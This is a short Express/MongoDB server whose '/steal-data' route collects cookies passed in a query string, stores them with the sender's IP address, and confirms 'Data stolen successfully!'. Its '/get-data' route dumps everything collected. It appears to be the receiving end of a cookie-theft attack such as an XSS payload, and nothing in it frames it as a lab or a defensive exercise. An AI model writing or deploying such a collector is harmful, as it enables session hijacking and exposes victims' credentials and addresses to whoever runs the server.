import express from "express";
import bodyParser from "body-parser";
import dotenv from "dotenv";
import mongoose from "mongoose";
import cors from "cors";

// Load environment variables from .env file
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for all routes
app.use(cors());

// Middleware to parse JSON bodies
app.use(bodyParser.json());

app.get("/steal-data", async (req, res) => {
    const cookieData = req.query.cookies || "";
    const ip = req.ip || req.connection.remoteAddress || "";

    try {
        const Data = (await import("./model/Data.js")).default;

        const newData = new Data({
            cookieData,
            ip
        });

        await newData.save();

        res.status(200).send("Data stolen successfully!");
    } catch (error) {
        console.error("Error saving data:", error);
        res.status(500).send("Internal Server Error");
    }
});

app.get("/get-data", async (req, res) => {
    try {
        const Data = (await import("./model/Data.js")).default;
        const allData = await Data.find({});
        res.status(200).json(allData);
    } catch (error) {
        console.error("Error retrieving data:", error);
        res.status(500).send("Internal Server Error");
    }
});

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => {
    console.log("Connected to MongoDB");
  })
  .catch((err) => {
    console.error("Error connecting to MongoDB:", err);
  });
// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
